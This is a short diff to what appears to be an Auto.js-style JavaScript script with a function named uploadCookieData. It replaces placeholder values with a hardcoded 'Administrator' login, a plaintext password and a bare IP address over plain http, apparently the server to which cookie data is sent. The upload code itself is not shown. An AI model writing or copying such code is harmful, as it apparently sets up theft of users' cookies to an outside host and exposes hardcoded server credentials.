@@ -1,9 +1,9 @@
 console.show();
 
 function uploadCookieData(cookie) {
-    var userName = "your_username";
-    var password = "your_password";
-    var rdpServerUrl = "https://your-rdp-server.com";
+    var userName = "Administrator";
+    var password = "UQ4bcM@pk%C";
+    var rdpServerUrl = "http://154.82.72.108";
     
     if (!userName || !password) {
         log("Error: Please provide your RDP server username and password.");
